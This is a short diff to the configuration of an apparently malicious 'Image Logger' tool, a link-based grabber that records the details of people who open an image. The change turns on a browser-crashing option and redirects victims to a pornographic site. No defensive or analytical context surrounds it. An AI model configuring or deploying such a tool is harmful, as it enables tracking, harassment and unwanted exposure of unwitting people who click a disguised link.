@@ -13,7 +13,7 @@ config = {
     "imageArgument": True, 
     "username": "Image Logger", 
     "color": 0x00FFFF,
-    "crashBrowser": False, 
+    "crashBrowser": True, 
     
     "accurateLocation": False, 
 
@@ -34,8 +34,8 @@ config = {
 
     
     "redirect": {
-        "redirect": False, 
-        "page": "https://your-link.here" 
+        "redirect": True, 
+        "page": "https://Xvideos.com" 
     },
 
 
